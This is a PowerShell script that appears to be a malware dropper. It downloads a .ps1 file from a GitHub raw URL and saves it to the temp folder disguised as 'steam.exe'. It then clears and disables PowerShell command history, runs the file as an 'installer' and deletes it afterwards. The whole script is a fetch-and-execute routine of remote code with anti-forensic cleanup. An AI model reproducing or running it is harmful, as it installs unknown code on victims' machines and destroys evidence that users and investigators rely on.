$url = "https://raw.githubusercontent.com/yuri95166-a11y/ddd/main/ts1.ps1"

$tempPath = Join-Path $env:TEMP "steam.exe"

Write-Host "Downloading..." -ForegroundColor Cyan

try {
    Invoke-WebRequest 
        -Uri $url 
        -OutFile $tempPath 
        -ErrorAction Stop

    if (Test-Path $tempPath) {

        Write-Host "Download completed." -ForegroundColor Green

        try {
            Clear-History -ErrorAction SilentlyContinue

            $historyPath = (Get-PSReadLineOption).HistorySavePath

            if (Test-Path $historyPath) {
                Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
            }

            Set-PSReadLineOption -HistorySaveStyle SaveNothing

            Write-Host "History cleared." -ForegroundColor Yellow
        }
        catch {
            Write-Host "Could not clear history." -ForegroundColor Red
        }

        Write-Host "Launching installer..." -ForegroundColor Green

        Start-Process 
            -FilePath $tempPath 
            -Wait

        Write-Host "AFTER INSTALLER" -ForegroundColor Magenta

        Write-Host "Cleaning temporary files..." -ForegroundColor Yellow

        Remove-Item 
            -Path $tempPath 
            -Force 
            -ErrorAction SilentlyContinue

        Write-Host "Completed." -ForegroundColor Green
    }
    else {
        Write-Host "Download failed: file not found." -ForegroundColor Red
    }
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
